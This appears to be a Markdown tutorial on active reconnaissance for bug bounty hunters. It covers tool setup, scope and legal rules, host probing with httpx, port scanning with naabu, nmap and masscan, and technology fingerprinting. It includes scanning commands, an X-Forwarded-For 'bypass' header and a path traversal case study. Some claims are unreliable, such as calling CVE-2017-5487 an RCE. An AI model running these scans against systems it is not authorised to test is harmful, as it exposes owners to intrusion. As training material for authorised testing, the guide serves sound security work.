# 🎯 Active Reconnaissance for Web Bug Bounty Hunting

## The Complete Practical Guide - From Zero to Hero

---

<div align="center">

![Version](https://img.shields.io/badge/version-2.0-blue.svg)
![Last Updated](https://img.shields.io/badge/last%20updated-February%202026-green.svg)
![License](https://img.shields.io/badge/license-MIT-purple.svg)
![Difficulty](https://img.shields.io/badge/difficulty-Beginner%20to%20Advanced-orange.svg)

**Master active reconnaissance techniques used by top bug bounty hunters**

[Getting Started](#-getting-started) • [Prerequisites](#-prerequisites) • [Methodology](#-methodology) • [Tools](#-tools-arsenal) • [Practice Labs](#-practice-labs)

</div>

---

## 📖 Table of Contents

- [Introduction](#-introduction)
- [What is Active Recon?](#-what-is-active-recon)
- [Prerequisites](#-prerequisites)
- [Legal & Ethical Guidelines](#%EF%B8%8F-legal--ethical-guidelines)
- [The Active Recon Methodology](#-the-active-recon-methodology)
- [Phase 1: Host Discovery](#phase-1-host-discovery--validation)
- [Phase 2: Port Scanning](#phase-2-port-scanning--service-detection)
- [Phase 3: Web Fingerprinting](#phase-3-web-technology-fingerprinting)
- [Phase 4: Content Discovery](#phase-4-content-discovery)
- [Phase 5: JavaScript Analysis](#phase-5-javascript-analysis)
- [Phase 6: API Enumeration](#phase-6-api-enumeration)
- [Phase 7: Visual Reconnaissance](#phase-7-visual-reconnaissance)
- [Phase 8: Vulnerability Scanning](#phase-8-automated-vulnerability-scanning)
- [Advanced Techniques](#-advanced-techniques)
- [Complete Automation](#-complete-automation-workflow)
- [Real-World Case Studies](#-real-world-case-studies)
- [Resources](#-additional-resources)
- [Contributing](#-contributing)

---

## 🌟 Introduction

### Who This Guide Is For

This guide is designed for:

- ✅ **Complete beginners** wanting to learn bug bounty hunting
- ✅ **Intermediate hunters** looking to improve their recon game
- ✅ **Security researchers** seeking systematic methodologies
- ✅ **Penetration testers** enhancing their skillset

### What You'll Learn

By the end of this guide, you will be able to:

- 🎯 Understand the difference between passive and active reconnaissance
- 🎯 Perform comprehensive active recon on web applications
- 🎯 Use industry-standard tools effectively
- 🎯 Identify attack surfaces that others miss
- 🎯 Automate your reconnaissance workflow
- 🎯 Find vulnerabilities worth $$$

### Learning Approach

This guide uses a **learn-by-doing** methodology:

```
Theory (20%) + Practice (80%) = Success
```

Each section includes:
- 📚 Conceptual explanation
- 🛠️ Practical commands
- 💡 Real-world examples
- 🏆 Actual bug bounty case studies
- 🎓 Hands-on exercises

---

## 🔍 What is Active Recon?

### The Restaurant Analogy

**Imagine you're investigating a restaurant:**

| Passive Recon | Active Recon |
|---------------|--------------|
| Reading online reviews | Walking into the restaurant |
| Checking menu on website | Asking staff questions |
| Looking at photos on Instagram | Inspecting the premises |
| Reading news articles | Trying different dishes |
| **Zero interaction** | **Direct interaction** |

### Technical Definition

```diff
+ Active Reconnaissance: Directly interacting with target systems
+ to discover information about infrastructure, services, and potential vulnerabilities

- Passive Reconnaissance: Gathering information WITHOUT touching target systems
```

### Key Differences

| Aspect | Passive | Active |
|--------|---------|--------|
| **Target Awareness** | No (invisible) | Yes (leaves logs) |
| **Speed** | Slow but safe | Fast but risky |
| **Accuracy** | Lower (outdated data) | Higher (real-time) |
| **Legal Risk** | Very low | Higher (need permission) |
| **Detection** | Impossible | Highly likely |
| **Tools** | Search engines, archives | Scanners, probes |

### Why Active Recon Matters

**Statistics from top bug bounty hunters:**

```
70% of high/critical bugs found through active recon
50% of unique findings come from custom active recon
30% higher payout on deeply researched targets
```

**What active recon reveals:**

- ✅ Live assets (not just DNS records)
- ✅ Exact technology versions (exploit opportunities)
- ✅ Hidden directories and files (forgotten admin panels)
- ✅ API endpoints (IDOR, authentication bypasses)
- ✅ Misconfigurations (cloud storage, debug modes)
- ✅ Real-time vulnerabilities (not historical data)

---

## 💻 Prerequisites

### Required Knowledge

#### Beginner Level (Start Here)

- [ ] Basic understanding of how websites work (HTTP/HTTPS)
- [ ] Familiarity with command line (Linux/Mac Terminal or Windows PowerShell)
- [ ] Basic networking concepts (IP addresses, ports, domains)
- [ ] Understanding of URLs and web browsers

**Don't know these?** → [Web Fundamentals Tutorial](https://developer.mozilla.org/en-US/docs/Learn)

#### Intermediate Level

- [ ] HTTP methods (GET, POST, PUT, DELETE)
- [ ] Status codes (200, 403, 404, 500, etc.)
- [ ] JSON and API basics
- [ ] Regular expressions (regex)
- [ ] Basic scripting (Bash or Python)

### Required Tools

#### Operating System

**Recommended: Kali Linux** (comes with most tools pre-installed)

```bash
# Download from: https://www.kali.org/get-kali/

# Alternatives:
- Ubuntu/Debian with manual tool installation
- macOS with Homebrew
- Windows with WSL2 + Kali
```

#### Essential Tools Installation

<details>
<summary><b>📦 Click to expand: Complete Installation Guide</b></summary>

##### 1. Go (Required for many tools)

```bash
# Download and install Go
wget https://go.dev/dl/go1.21.5.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.21.5.linux-amd64.tar.gz

# Add to PATH
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
echo 'export PATH=$PATH:~/go/bin' >> ~/.bashrc
source ~/.bashrc

# Verify
go version
```

##### 2. Core Recon Tools

```bash
# httpx - HTTP toolkit
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest

# naabu - Port scanner
go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest

# subfinder - Subdomain enumeration
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest

# nuclei - Vulnerability scanner
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# ffuf - Web fuzzer
go install github.com/ffuf/ffuf/v2@latest

# waybackurls - Archive URLs
go install github.com/tomnomnom/waybackurls@latest

# gau - Get All URLs
go install github.com/lc/gau/v2/cmd/gau@latest

# gowitness - Screenshot tool
go install github.com/sensepost/gowitness@latest
```

##### 3. Python Tools

```bash
# Install pip3
sudo apt install python3-pip -y

# Dirsearch - Directory bruteforcer
git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
pip3 install -r requirements.txt

# Arjun - Parameter discovery
pip3 install arjun

# Sublist3r - Subdomain enumeration
git clone https://github.com/aboul3la/Sublist3r.git
cd Sublist3r
pip3 install -r requirements.txt
```

##### 4. Additional Tools

```bash
# Nmap - Network scanner
sudo apt install nmap -y

# Nikto - Web server scanner
sudo apt install nikto -y

# WPScan - WordPress scanner
sudo apt install wpscan -y

# SQLMap - SQL injection tool
sudo apt install sqlmap -y

# jq - JSON processor
sudo apt install jq -y

# Amass - Asset discovery
sudo apt install amass -y
```

##### 5. Wordlists

```bash
# SecLists - The ultimate wordlist collection
cd ~/
git clone https://github.com/danielmiessler/SecLists.git

# Set environment variable
echo 'export WORDLISTS=~/SecLists' >> ~/.bashrc
source ~/.bashrc
```

##### 6. Verify Installation

```bash
# Create verification script
cat > ~/verify_tools.sh << 'EOF'
#!/bin/bash

tools=(
    "httpx"
    "naabu"
    "subfinder"
    "nuclei"
    "ffuf"
    "waybackurls"
    "gau"
    "gowitness"
    "nmap"
    "nikto"
    "wpscan"
    "jq"
    "amass"
)

echo "Checking installed tools..."
for tool in "${tools[@]}"; do
    if command -v $tool &> /dev/null; then
        echo "✓ $tool installed"
    else
        echo "✗ $tool NOT FOUND"
    fi
done
EOF

chmod +x ~/verify_tools.sh
~/verify_tools.sh
```

</details>

### Recommended Hardware

```
Minimum:
- 4GB RAM
- 20GB free disk space
- Stable internet connection

Recommended:
- 8GB+ RAM
- 50GB+ SSD
- VPS (for continuous monitoring)
```

---

## ⚖️ Legal & Ethical Guidelines

### 🚨 CRITICAL: Read This Before Starting

```diff
! ACTIVE RECON TOUCHES REAL SERVERS
! YOU WILL LEAVE TRACES IN LOGS
! YOU CAN FACE LEGAL CONSEQUENCES IF YOU VIOLATE RULES
```

### The Golden Rules

#### 1. **ALWAYS Get Permission**

```
✅ Bug Bounty Program Scope = Permission granted
✅ Written authorization from owner
✅ Your own infrastructure for testing

❌ Random websites you find interesting
❌ Websites "just to test your skills"
❌ Competitors of companies you work for
```

#### 2. **Respect the Scope**

Every bug bounty program defines scope:

```yaml
IN SCOPE:
  - *.example.com
  - example.io
  - api.example.com

OUT OF SCOPE:
  - *.example.co.uk
  - blog.example.com (third-party)
  - example.gov
```

**ONE request to an out-of-scope domain = Instant ban + Legal action**

#### 3. **Rate Limiting is Mandatory**

```bash
# ❌ BAD (Aggressive - will get banned)
ffuf -w wordlist.txt -u https://target.com/FUZZ -t 200 -rate 5000

# ✅ GOOD (Respectful - professional)
ffuf -w wordlist.txt -u https://target.com/FUZZ -t 10 -rate 50
```

**Recommended Rates:**
- Small targets: 10-20 requests/second
- Medium targets: 30-50 requests/second
- Large targets (Google, Facebook): 100-200 requests/second
- **When in doubt:** Start slow (5 req/sec), increase gradually

#### 4. **Time Your Scans**

```
✅ Best Time: 2AM-6AM in target's timezone (off-peak)
✅ Weekend mornings
✅ Avoid: Black Friday, holiday seasons, product launches

❌ NEVER during peak business hours (9AM-5PM)
❌ NEVER during known high-traffic events
```

#### 5. **Monitor Your Impact**

```bash
# If you see these responses, STOP IMMEDIATELY:
- 429 Too Many Requests
- 503 Service Unavailable
- Cloudflare/Akamai CAPTCHA pages
- "You have been blocked" messages

# Action:
1. Stop all scans
2. Wait 1 hour
3. Reduce rate by 50%
4. Resume carefully
```

#### 6. **Prohibited Actions**

```diff
- ❌ Social engineering (phishing employees)
- ❌ Physical testing (visiting offices)
- ❌ Denial of Service (crashing services)
- ❌ Accessing other users' data (even if possible)
- ❌ Modifying/deleting data
- ❌ Automated vulnerability exploitation (without permission)
- ❌ Testing on production payment systems
- ❌ Spam/bulk account creation
```

### Legal Disclaimer

```
⚠️ IMPORTANT LEGAL NOTICE ⚠️

The techniques in this guide are for:
1. Authorized bug bounty programs
2. Personal testing environments
3. Educational purposes with explicit permission

The author and contributors:
- Do NOT encourage illegal hacking
- Are NOT responsible for misuse of this information
- Assume you will act responsibly and ethically

BY USING THIS GUIDE, YOU AGREE:
- To only test authorized targets
- To follow all applicable laws
- To respect program rules
- To act ethically at all times

Unauthorized access to computer systems is ILLEGAL in most countries.
Penalties include fines, imprisonment, and civil liability.

BE SMART. BE LEGAL. BE ETHICAL.
```

### Recommended Bug Bounty Platforms

**Start here for legal targets:**

| Platform | Beginner-Friendly | Programs |
|----------|-------------------|----------|
| [HackerOne](https://hackerone.com) | ⭐⭐⭐⭐⭐ | 2000+ |
| [Bugcrowd](https://bugcrowd.com) | ⭐⭐⭐⭐ | 800+ |
| [Intigriti](https://intigriti.com) | ⭐⭐⭐⭐ | 500+ |
| [YesWeHack](https://yeswehack.com) | ⭐⭐⭐ | 600+ |
| [Synack](https://synack.com) | ⭐⭐ | Invite-only |

### Practice Legally

**Intentionally Vulnerable Applications:**

```bash
# Local practice (100% legal)
docker run -d -p 80:80 vulnerables/web-dvwa
docker run -d -p 3000:3000 bkimminich/juice-shop

# Online practice ranges
http://testphp.vulnweb.com
http://testhtml5.vulnweb.com
https://portswigger.net/web-security (PortSwigger Academy)
http://scanme.nmap.org (explicitly allows scanning)
```

---

## 🎯 The Active Recon Methodology

### Overview

Active reconnaissance follows a systematic, layered approach:

```
┌─────────────────────────────────────────┐
│         PASSIVE RECON (Done First)      │
│  Subdomains, Historical Data, OSINT     │
└────────────────┬────────────────────────┘
                 │
                 ↓
┌─────────────────────────────────────────┐
│      PHASE 1: HOST DISCOVERY            │
│  Which domains/IPs are actually alive?  │
└────────────────┬────────────────────────┘
                 │
                 ↓
┌─────────────────────────────────────────┐
│      PHASE 2: PORT SCANNING             │
│  Which services are running? Where?     │
└────────────────┬────────────────────────┘
                 │
                 ↓
┌─────────────────────────────────────────┐
│      PHASE 3: FINGERPRINTING            │
│  What technologies/versions are used?   │
└────────────────┬────────────────────────┘
                 │
                 ↓
┌─────────────────────────────────────────┐
│      PHASE 4: CONTENT DISCOVERY         │
│  Hidden paths, files, directories?      │
└────────────────┬────────────────────────┘
                 │
                 ↓
┌─────────────────────────────────────────┐
│      PHASE 5: JAVASCRIPT ANALYSIS       │
│  Secrets, endpoints in JS files?        │
└────────────────┬────────────────────────┘
                 │
                 ↓
┌─────────────────────────────────────────┐
│      PHASE 6: API ENUMERATION           │
│  API endpoints, documentation, methods? │
└────────────────┬────────────────────────┘
                 │
                 ↓
┌─────────────────────────────────────────┐
│      PHASE 7: VISUAL RECON              │
│  Screenshots, manual inspection         │
└────────────────┬────────────────────────┘
                 │
                 ↓
┌─────────────────────────────────────────┐
│      PHASE 8: VULNERABILITY SCANNING    │
│  Automated checks for known issues      │
└────────────────┬────────────────────────┘
                 │
                 ↓
┌─────────────────────────────────────────┐
│         MANUAL EXPLOITATION             │
│     Validate and exploit findings       │
└─────────────────────────────────────────┘
```

### Time Allocation

Recommended time distribution for effective recon:

```
Phase 1 (Host Discovery):        10% (30 min)
Phase 2 (Port Scanning):         10% (30 min)
Phase 3 (Fingerprinting):        15% (45 min)
Phase 4 (Content Discovery):     20% (1 hour)
Phase 5 (JS Analysis):           15% (45 min)
Phase 6 (API Enumeration):       15% (45 min)
Phase 7 (Visual Recon):          10% (30 min)
Phase 8 (Vuln Scanning):         5%  (15 min)

Total Active Recon Time: ~5 hours per target
Manual Testing Time: 10-20 hours per target
```

---

## Phase 1: Host Discovery & Validation

### 🎯 Objective

**Verify which assets from passive recon are actually alive and accessible.**

### Why This Matters

```
Passive recon gave you 1000 subdomains
  ↓
500 are dead/DNS only
  ↓
500 are actually serving content
    ↓
    50 are high-value targets (admin, api, staging)
        ↓
        5 have vulnerabilities
            ↓
            1 gets you $10,000
```

**This phase filters the noise and identifies gold.**

### 🛠️ Primary Tool: httpx

#### What is httpx?

`httpx` is a fast and multi-purpose HTTP toolkit that:
- Probes URLs for live hosts
- Extracts titles, status codes, tech stacks
- Detects web servers, CDNs, WAFs
- Screenshots pages
- Handles massive lists efficiently

#### Installation

```bash
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
```

#### Basic Usage

##### Example 1: Single Domain

```bash
echo "example.com" | httpx

# Output:
https://example.com [200 OK] [nginx/1.18.0] [Example Domain]
```

##### Example 2: From File

```bash
# Create input file
cat > domains.txt << EOF
admin.example.com
dev.example.com
api.example.com
notexist.example.com
EOF

# Probe for live hosts
cat domains.txt | httpx

# Output:
https://admin.example.com [200 OK]
https://dev.example.com [403 Forbidden]
https://api.example.com [401 Unauthorized]
# notexist.example.com - no output (dead)
```

##### Example 3: Detailed Information

```bash
cat domains.txt | httpx -title -tech-detect -status-code -ip -cdn

# Output with full details:
https://admin.example.com [200] [Apache/2.4.41] [Admin Panel] [104.21.45.67] [cloudflare]
https://dev.example.com [403] [nginx/1.18.0] [403 Forbidden] [172.67.145.23] [cloudflare]
https://api.example.com [401] [Node.js] [Unauthorized] [198.51.100.45] [-]
```

#### Advanced Usage

##### Extract Multiple Attributes

```bash
httpx -l subdomains.txt \
  -title \                    # Page title
  -tech-detect \              # Technology stack
  -status-code \              # HTTP status
  -content-length \           # Response size
  -web-server \               # Server header
  -ip \                       # IP address
  -cname \                    # CNAME record
  -cdn \                      # CDN detection
  -probe \                    # Probe all ports
  -screenshot \               # Take screenshots
  -json \                     # JSON output
  -o results.json             # Save to file
```

##### Filter by Status Codes

```bash
# Only show successful responses
cat domains.txt | httpx -mc 200

# Show interesting codes (200, 403, 401)
cat domains.txt | httpx -mc 200,403,401

# Exclude specific codes
cat domains.txt | httpx -fc 404,503
```

##### Custom Headers (Bypass Restrictions)

```bash
# Custom User-Agent
cat domains.txt | httpx -H "User-Agent: Mozilla/5.0"

# Custom headers (for authentication testing)
cat domains.txt | httpx -H "X-Forwarded-For: 127.0.0.1"
```

##### Follow Redirects

```bash
# Follow redirects and show final URL
cat domains.txt | httpx -follow-redirects

# Example:
http://example.com → https://example.com → https://www.example.com [FINAL]
```

##### Rate Limiting (IMPORTANT)

```bash
# Limit to 50 requests per second
cat large_list.txt | httpx -rate-limit 50

# Limit concurrent threads
cat large_list.txt | httpx -threads 10
```

#### Practical Example: Full Discovery

```bash
# Step 1: Create comprehensive scan
cat subdomains.txt | httpx \
  -title \
  -tech-detect \
  -status-code \
  -ip \
  -cdn \
  -content-length \
  -web-server \
  -rate-limit 50 \
  -threads 25 \
  -timeout 10 \
  -retries 2 \
  -json \
  -o httpx_full_scan.json

# Step 2: Parse results for interesting findings
cat httpx_full_scan.json | jq -r 'select(.status_code == 403) | .url'
# Shows all 403 Forbidden (something exists but blocked)

cat httpx_full_scan.json | jq -r 'select(.title | contains("admin")) | .url'
# Shows pages with "admin" in title

cat httpx_full_scan.json | jq -r 'select(.tech | contains("WordPress")) | .url'
# Shows WordPress sites
```

### 🎯 What to Look For

#### Status Code Interpretation

| Status Code | Meaning | Action |
|-------------|---------|--------|
| **200 OK** | Page loads normally | ✅ Inspect content |
| **301/302** | Redirect | ✅ Follow it |
| **401 Unauthorized** | Auth required | 🔥 Try default creds |
| **403 Forbidden** | Access denied | 🔥 Try bypass techniques |
| **404 Not Found** | Doesn't exist | ⚠️ Low priority |
| **500 Server Error** | Application error | 🔥 May leak info |
| **502/504 Gateway** | Proxy/backend issue | ⚠️ Check periodically |

#### High-Value Indicators

```bash
# Look for these in titles/content
admin
administrator  
dashboard
panel
console
login
portal
internal
dev
development
staging
test
debug
api
swagger
graphql
phpmyadmin
cpanel
plesk
jenkins
grafana
kibana
```

### 💡 Real-World Example

```bash
# Scenario: You have 2,000 subdomains from passive recon

# Step 1: Quick probe (2 minutes)
cat 2000_subdomains.txt | httpx -silent > live_hosts.txt

# Result: 847 live hosts found

# Step 2: Detailed scan (10 minutes)
cat live_hosts.txt | httpx \
  -title \
  -tech-detect \
  -status-code \
  -rate-limit 30 \
  -json \
  -o detailed_scan.json

# Step 3: Find admin panels
cat detailed_scan.json | jq -r 'select(.title | test("admin|dashboard|panel"; "i")) | .url'

# Found:
https://old-admin.target.com [200] [Admin Dashboard v2.1]
https://staging-panel.target.com [403] [Forbidden - Admin Area]
https://internal-dashboard.target.com [401] [Login Required]

# Step 4: Prioritize testing
# - old-admin.target.com (200 = accessible!)
# - staging-panel.target.com (403 = try bypass)
# - internal-dashboard.target.com (401 = try default creds)
```

### 🏆 Case Study: Real Bounty via Host Discovery

```
Hunter: @samwcyo
Platform: HackerOne
Target: [Redacted E-commerce Company]
Bounty: $5,000

Process:
1. Collected 3,500 subdomains via passive recon
2. Used httpx to find live hosts
3. Filtered for 403 Forbidden status codes
4. Found: admin-old.target.com [403 Forbidden]
5. Tried path traversal: /admin-old/../admin → [200 OK]
6. Accessed admin panel without authentication
7. Reported → $5,000 bounty

Key Lesson: 403 doesn't mean dead end. It means something valuable exists.
```

### 🎓 Practice Exercise

```bash
# Exercise 1: Probe these test domains
cat > test_domains.txt << EOF
google.com
facebook.com
twitter.com
example.com
thisdomaindoesnotexist123456.com
EOF

# Task 1: Find which are alive
cat test_domains.txt | httpx

# Task 2: Get detailed info
cat test_domains.txt | httpx -title -status-code -tech-detect

# Task 3: Save results
cat test_domains.txt | httpx -json -o my_first_scan.json

# Task 4: Parse JSON
cat my_first_scan.json | jq -r '.url'
cat my_first_scan.json | jq -r '.title'
```

### 📊 Quick Reference

```bash
# Basic probe
echo "target.com" | httpx

# Full scan with all options
httpx -l domains.txt -title -tech-detect -status-code -ip -cdn -o results.txt

# Only show 200 OK
httpx -l domains.txt -mc 200

# Rate limited scan
httpx -l domains.txt -rate-limit 30 -threads 10

# JSON output for parsing
httpx -l domains.txt -json | jq -r '.url'

# Screenshot mode
httpx -l domains.txt -screenshot -screenshot-path ./screens/
```

---

## Phase 2: Port Scanning & Service Detection

### 🎯 Objective

**Identify open ports and running services to discover additional attack surfaces.**

### Why Port Scanning Matters

```
Website on port 443 (HTTPS) ← Everyone tests this
  ↓
But also:
  Port 8080 → Development server (no auth!)
  Port 3000 → React dev server (source maps exposed)
  Port 9200 → Elasticsearch (public access)
  Port 27017 → MongoDB (no password)
  Port 6379 → Redis (session hijacking)
  
One forgotten port = One critical vulnerability
```

### Understanding Ports

#### Analogy: Apartment Building

```
Server = Apartment Building at 123 Main St (IP Address)

Port 80   = Front door (Public website)
Port 443  = Secure entrance (HTTPS)
Port 22   = Staff entrance (SSH - should be locked!)
Port 3306 = Basement door (MySQL - should be internal only!)
Port 8080 = Side door (Admin panel - often forgotten!)
```

#### Port Ranges

```
0-1023     Well-known ports (HTTP, HTTPS, SSH, FTP)
1024-49151 Registered ports (MySQL, PostgreSQL, Redis)
49152-65535 Dynamic/Private ports
```

### 🛠️ Primary Tool: naabu

#### What is naabu?

Fast port scanner written in Go by ProjectDiscovery:
- Extremely fast (uses SYN scan)
- Can scan entire internet quickly
- Integrates well with other tools
- Built-in host discovery

#### Installation

```bash
go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest
```

#### Basic Usage

##### Example 1: Scan Single Host

```bash
naabu -host example.com

# Output:
example.com:80
example.com:443
example.com:8080
```

##### Example 2: Scan Top Ports

```bash
# Top 100 ports
naabu -host example.com -top-ports 100

# Top 1000 ports
naabu -host example.com -top-ports 1000

# Full port scan (all 65535 ports) - USE CAREFULLY
naabu -host example.com -p -
```

##### Example 3: Scan Multiple Hosts

```bash
# From file
naabu -list hosts.txt -top-ports 1000

# From pipe
cat live_hosts.txt | naabu -top-ports 1000
```

##### Example 4: Scan Specific Ports

```bash
# Web ports only
naabu -host example.com -p 80,443,8080,8443,3000,5000,8000,8888

# Common database ports
naabu -host example.com -p 3306,5432,27017,6379,9200

# Port range
naabu -host example.com -p 1-1000
```

#### Advanced Usage

##### Rate Limiting (Critical for Bug Bounty)

```bash
# Limit rate to 150 packets per second
naabu -host example.com -rate 150

# With specific ports
naabu -host example.com -p 80,443,8080 -rate 100
```

##### Output Options

```bash
# Save to file
naabu -host example.com -o ports.txt

# JSON output
naabu -host example.com -json -o ports.json

# Silent mode (only results)
naabu -host example.com -silent
```

##### Combined with Other Tools

```bash
# Scan then probe with httpx
naabu -host example.com -p 80,443,8080,8443 -silent | httpx

# From subdomains to open ports to live services
cat subdomains.txt | naabu -top-ports 1000 -silent | httpx -title -tech-detect
```

### 🎯 Essential Port Reference

#### Web Service Ports

```bash
80      HTTP (standard web)
443     HTTPS (secure web)
8000    Alternative HTTP
8008    Alternative HTTP
8080    HTTP Proxy / Alternative HTTP (common for admin panels)
8443    Alternative HTTPS
8888    Alternative HTTP (Jupyter Notebooks often use this)
3000    Node.js / React dev servers
5000    Flask / Python apps
9090    Prometheus / Various web services
```

#### Critical Ports (Should NOT Be Public!)

```bash
21      FTP (file transfer - often anonymous access)
22      SSH (remote access - key target for brute force)
23      Telnet (unencrypted remote access - ancient, vulnerable)
3306    MySQL (database)
5432    PostgreSQL (database)
1433    MS SQL Server (database)
6379    Redis (in-memory database - often no password!)
27017   MongoDB (NoSQL database - famous for leaks)
9200    Elasticsearch (search engine - data exposure)
5984    CouchDB (database)
```

#### Application-Specific Ports

```bash
# Jenkins (CI/CD)
8080    Jenkins web interface
8081    Alternative Jenkins
50000   Jenkins agent

# Docker
2375    Docker API (unencrypted)
2376    Docker API (TLS)
4243    Docker remote API

# Kubernetes
6443    Kubernetes API server
10250   Kubelet API

# Monitoring & Logging
3000    Grafana
5601    Kibana
9200    Elasticsearch

# Message Queues
5672    RabbitMQ
15672   RabbitMQ Management

# Application Servers
8080    Tomcat
8009    Tomcat AJP
7001    WebLogic
9000    PHP-FPM
4848    GlassFish
```

### 💡 Practical Workflow

#### Scenario: Complete Port Enumeration

```bash
# Step 1: Quick scan on common web ports (fast)
cat live_hosts.txt | naabu -p 80,443,8080,8443,3000,8000 -rate 200 -silent > web_ports.txt

# Step 2: Detailed scan on high-value targets (slower)
cat high_priority_hosts.txt | naabu -top-ports 1000 -rate 150 -o detailed_ports.txt

# Step 3: Full scan on single critical target (slowest)
naabu -host admin.target.com -p - -rate 100 -o admin_all_ports.txt

# Step 4: Identify web services
cat web_ports.txt | httpx -title -tech-detect -status-code -o web_services.txt

# Step 5: Check for dangerous ports
grep -E ":(22|3306|5432|6379|27017|9200)" detailed_ports.txt
```

### 🛠️ Alternative Tool: masscan

#### When to Use masscan

```
naabu:   Good for most bug bounty scenarios
masscan: Best for scanning HUGE ranges (entire ASN)

Warning: masscan is VERY fast and VERY loud
        Only use when explicitly permitted
```

#### Installation

```bash
sudo apt install masscan -y
```

#### Usage

```bash
# Scan specific ports on IP range
sudo masscan 192.168.1.0/24 -p80,443,8080

# Scan top ports
sudo masscan 10.0.0.0/8 -p1-1000 --rate 1000

# Save results
sudo masscan 192.168.1.0/24 -p80,443 -oL masscan_results.txt
```

### 🏆 Case Study: Port Scan Leading to RCE

```
Hunter: @nahamsec
Platform: HackerOne  
Target: [Redacted SaaS Company]
Bounty: $10,000

Discovery Process:
1. Ran naabu on company's IP range
   naabu -host target.com -top-ports 1000

2. Found unusual port: 8009 (Apache Tomcat AJP)
   target.com:8009 [open]

3. Researched: "Tomcat AJP port 8009 exploit"
   Found: CVE-2020-1938 (Ghostcat)

4. Exploited:
   - Read arbitrary files via AJP
   - Extracted /WEB-INF/web.xml
   - Found database credentials
   - Pivoted to RCE

5. Reported: Critical RCE via exposed AJP port
   Bounty: $10,000

Key Lesson: One forgotten port = Critical vulnerability
```

### 🎯 Port Scanning Checklist

```bash
For each open port found:

✅ Research the service
   □ What typically runs on this port?
   □ Known vulnerabilities?
   □ Default credentials?

✅ Banner grabbing
   □ What version is running?
   □ Any CVEs for that version?

✅ Access testing
   □ Can you connect without auth?
   □ Any exposed data?

✅ Documentation
   □ Screenshot/save output
   □ Note in recon report
```

### 🔍 Service Version Detection

#### Using nmap for Detailed Service Info

```bash
# After finding ports with naabu, use nmap for versions
nmap -sV -p 80,443,8080 target.com

# Output:
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx 1.18.0
443/tcp  open  ssl/http nginx 1.18.0
8080/tcp open  http    Apache Tomcat 7.0.52

# Now search: "Apache Tomcat 7.0.52 exploit"
```

#### Banner Grabbing Manually

```bash
# HTTP banner
curl -I https://target.com

# Server response:
Server: nginx/1.18.0 (Ubuntu)
X-Powered-By: PHP/7.4.3

# SSH banner
nc target.com 22
# Output: SSH-2.0-OpenSSH_7.9p1

# FTP banner
nc target.com 21
# Output: 220 ProFTPD 1.3.5 Server
```

### 🎓 Practice Exercise

```bash
# Exercise 1: Scan scanme.nmap.org (legal test target)
naabu -host scanme.nmap.org -top-ports 100

# Exercise 2: Scan your local machine
naabu -host 127.0.0.1 -p 1-10000

# Exercise 3: Scan and probe
echo "example.com" | naabu -p 80,443,8080 -silent | httpx -title

# Exercise 4: Create port scan report
cat > portscan.sh << 'EOF'
#!/bin/bash
TARGET=$1
naabu -host $TARGET -top-ports 1000 -json -o ${TARGET}_ports.json
cat ${TARGET}_ports.json | jq -r '.port' | sort -n
EOF
chmod +x portscan.sh
./portscan.sh example.com
```

### ⚠️ Port Scanning Best Practices

```diff
+ DO:
  ✅ Start with top 100-1000 ports
  ✅ Use rate limiting (-rate 100-200)
  ✅ Scan during off-peak hours
  ✅ Document findings thoroughly
  ✅ Focus on targets in scope

- DON'T:
  ❌ Scan all 65535 ports on everything
  ❌ Use aggressive rates (--rate 10000)
  ❌ Scan government/military IPs
  ❌ Ignore WAF blocks/rate limits
  ❌ Scan out-of-scope networks
```

### 📊 Quick Reference

```bash
# Basic web ports scan
naabu -host target.com -p 80,443,8080,8443

# Top 1000 ports
naabu -host target.com -top-ports 1000

# Full port scan (careful!)
naabu -host target.com -p -

# From subdomain list
cat subs.txt | naabu -top-ports 1000 -rate 150

# Save results
naabu -host target.com -top-ports 1000 -o ports.txt

# Pipe to httpx
naabu -host target.com -p 80,443,8080 | httpx -title
```

---

## Phase 3: Web Technology Fingerprinting

### 🎯 Objective

**Identify exact technologies, frameworks, and versions to find known vulnerabilities.**

### Why Technology Detection is Critical

```
Finding "WordPress" = Good
Finding "WordPress 4.7.0" = JACKPOT!

Why? WordPress 4.7.0 has CVE-2017-5487 (RCE)
     Instant critical vulnerability found
     Possible $5,000-$15,000 bounty
```

**Technology versions = Exploit database keys**

### What to Detect

```yaml
Web Servers:
  - Apache (version?)
  - Nginx (version?)
  - IIS (version?)
  - LiteSpeed
  - Caddy

Programming Languages:
  - PHP (version?)
  - Python (Flask/Django?)
  - Node.js (Express?)
  - Java (Spring/Tomcat?)
  - Ruby (Rails?)
  - ASP.NET

CMS (Content Management Systems):
  - WordPress (version + plugins!)
  - Drupal
  - Joomla
  - Magento
  - Shopify

Frameworks:
  - React
  - Angular
  - Vue.js
  - Laravel
  - Django
  - Spring Boot

Infrastructure:
  - Cloudflare (CDN/WAF)
  - AWS CloudFront
  - Akamai
  - Docker
  - Kubernetes

Databases (if exposed):
  - MySQL
  - PostgreSQL
  - MongoDB
  - Redis
  - Elasticsearch
```

### 🛠️ Tool 1: Wappalyzer (Browser Extension)

#### Installation

```
Chrome: https://chrome.google.com/webstore
Firefox: https://addons.mozilla.org
Search: "Wappalyzer"
```

#### Usage

```
1. Install extension
2. Visit target website
3. Click Wappalyzer icon
4. See instant technology stack

Example output for airbnb.com:
├─ Programming Language: Ruby
├─ Web Framework: Ruby on Rails
├─ Web Server: Nginx
├─ CDN: Cloudflare
├─ JavaScript: React
├─ Analytics: Google Analytics
└─ Tag Manager: Google Tag Manager
```

#### Pro Tip: Export Results

```javascript
// Open Console (F12)
// Run this to export technologies as JSON
JSON.stringify(wappalyzer.technologies)
```

### 🛠️ Tool 2: WhatWeb (Command Line)

#### Installation

```bash
# Kali Linux (pre-installed)
whatweb

# Ubuntu/Debian
sudo apt install whatweb -y

# macOS
brew install whatweb
```

#### Basic Usage

```bash
# Scan single URL
whatweb https://example.com

# Output:
https://example.com [200 OK] 
  Country[UNITED STATES][US]
  HTTPServer[nginx/1.18.0]
  IP[93.184.216.34]
  nginx[1.18.0]
